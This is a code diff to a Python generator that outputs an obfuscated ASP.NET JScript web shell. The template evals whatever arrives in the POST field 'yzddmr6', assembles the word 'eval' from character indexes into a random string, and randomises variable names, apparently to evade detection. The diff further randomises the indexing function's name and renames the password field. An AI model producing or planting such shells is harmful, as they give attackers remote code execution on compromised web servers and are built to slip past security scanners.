@@ -18,23 +18,24 @@ def random_index():
     for i in range(len(func)):
         ids.append(str_random.lower().find(func[i]))
    # print(ids)
+    name=random_name(4)
     for i in ids:
-        tmp='a({})'.format(i)
+        tmp='{0}({1})'.format(name,i)
         tmp_list.append(tmp)
        # print('+'.join(tmp_list))
-    return str_random,'+'.join(tmp_list)
+    return str_random,'+'.join(tmp_list),name
     
 def shell_main():
     text='''
 <%@ Page Language="Jscript" Debug=true%>
 <%
 var {2}='{0}';
-var {3}=Request.Form("mr6");
+var {3}=Request.Form("yzddmr6");
 var {4}={1};
 eval({3},{4});
 %>
     '''
-    str_random,payload=random_index()
-    res=text.format(str_random,payload,random_name(4),random_name(4),random_name(4))
+    str_random,payload,name=random_index()
+    res=text.format(str_random,payload,name,random_name(4),random_name(4))
     print(res)
 shell_main()
